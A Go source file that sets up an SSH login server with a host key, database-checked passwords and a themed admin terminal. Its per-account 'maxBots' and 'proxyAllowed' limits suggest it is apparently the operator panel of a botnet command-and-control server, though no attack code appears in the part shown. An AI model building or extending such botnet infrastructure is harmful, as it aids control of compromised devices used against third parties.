package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strconv"

	"golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

func loadOrGenerateHostKey(path string) (ssh.Signer, error) {
	if data, err := os.ReadFile(path); err == nil {
		return ssh.ParsePrivateKey(data)
	}

	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	block := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(key),
	}
	if err := os.WriteFile(path, pem.EncodeToMemory(block), 0600); err != nil {
		return nil, err
	}

	return ssh.NewSignerFromKey(key)
}

func startSSHServer(port int) error {
	hostKey, err := loadOrGenerateHostKey(filepath.Join(configDir(), "server.key"))
	if err != nil {
		return fmt.Errorf("ssh host key: %v", err)
	}

	config := &ssh.ServerConfig{
		PasswordCallback: func(conn ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			ok, accInfo := database.TryLogin(conn.User(), string(pass))
			if !ok {
				return nil, fmt.Errorf("password rejected")
			}
			return &ssh.Permissions{
				Extensions: map[string]string{
					"maxBots":      strconv.Itoa(accInfo.maxBots),
					"admin":        strconv.Itoa(accInfo.admin),
					"proxyAllowed": strconv.Itoa(accInfo.proxyAllowed),
				},
			}, nil
		},
	}
	config.AddHostKey(hostKey)

	listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		return err
	}
	fmt.Printf("[ssh] listening on 0.0.0.0:%d\n", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			break
		}
		go handleSSHConnection(conn, config)
	}

	return fmt.Errorf("ssh accept loop exited")
}

func handleSSHConnection(nConn net.Conn, config *ssh.ServerConfig) {
	conn, chans, reqs, err := ssh.NewServerConn(nConn, config)
	if err != nil {
		return
	}
	defer conn.Close()
	fmt.Printf("[ssh] %s logged in from %s\n", conn.User(), nConn.RemoteAddr())

	go ssh.DiscardRequests(reqs)

	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}
		channel, requests, err := newChannel.Accept()
		if err != nil {
			continue
		}

		go func() {
			for req := range requests {
				if req.Type == "pty-req" {
					termLen := 0
					if len(req.Payload) >= 8 {
						termLen = int(req.Payload[3])
					}
					if termLen > 0 && termLen < len(req.Payload)-4 {
						// got a terminal type from client
					}
				}
				req.Reply(true, nil)
			}
		}()

		username := conn.User()
		prompt := fmt.Sprintf("\033[%sm╔══\033[%sm%s\r\n\033[%sm╚═════► \033[%sm",
			theme.Separator, theme.Header, username, theme.Separator, theme.Prompt)

		t := term.NewTerminal(channel, prompt)

		maxBots, _ := strconv.Atoi(conn.Permissions.Extensions["maxBots"])
		admin, _ := strconv.Atoi(conn.Permissions.Extensions["admin"])
		proxyAllowed, _ := strconv.Atoi(conn.Permissions.Extensions["proxyAllowed"])

		adminObj := &Admin{
			term:      t,
			rawWriter: channel,
			userInfo: AccountInfo{
				username:     username,
				maxBots:      maxBots,
				admin:        admin,
				proxyAllowed: proxyAllowed,
			},
		}
		adminObj.Handle()
	}
}
